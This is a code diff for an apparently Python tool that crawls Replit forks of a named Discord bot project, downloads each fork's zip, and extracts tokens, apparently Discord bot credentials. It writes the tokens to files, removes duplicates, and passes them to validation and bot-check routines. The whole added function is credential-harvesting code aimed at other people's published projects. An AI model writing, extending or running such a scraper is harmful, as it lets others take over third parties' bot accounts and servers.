@@ -105,7 +105,42 @@ async def main(url: str, start: int = None, stop: int = None):
 
 
 
+async def search_zips(url: str):
+    repl = ReplIt()
+    await Design.ascii()
+    await aprint("Searching through zips...")
+    id = await repl.get_id(url)
+    urls, ids = await repl.get_forks(id)
+    full = []
+    count = 0
+    for id in ids:
+        try:
+            tokens = await repl.search_zip(id)
+            await aprint(f"{color.GREEN}Finished fork {count+1}{color.RESET}")
+            count += 1
 
+            for token in tokens:
+                with open("./false_tokens.txt", "a+") as f:
+                    f.write(f"{token}\n")
+            full += tokens
+        except:
+            continue
+
+    await repl.clean_dirs()
+
+
+    for token in full:
+        await aprint(f"{color.GREEN}Found token: {token}{color.RESET}")
+    await aprint(f"{color.YELLOW}Removing duplicates... {color.RESET}")
+    lines_seen = set()
+    outfile = open("tokens.txt", "w")
+    for line in open("false_tokens.txt", "r"):
+        if line not in lines_seen:
+            outfile.write(line)
+            lines_seen.add(line)
+    outfile.close()
+    await repl.check()
+    await repl.bot_check()
 
 # Scrapes from /community/discord
 # Finds forks too
@@ -194,7 +229,10 @@ async def validate():
 
 if __name__ == "__main__":
     # Scrape forks from a url
-    asyncio.run(main("/@Npgop/Saturn-bot"))
+    # asyncio.run(main("/@Remixstudio/Discord-MusicBot", start=1000))
+
+    # Searches through each zip
+    asyncio.run(search_zips("/@Remixstudio/Discord-MusicBot"))
 
     # Scrape from community/discord
     # asyncio.run(scrape())
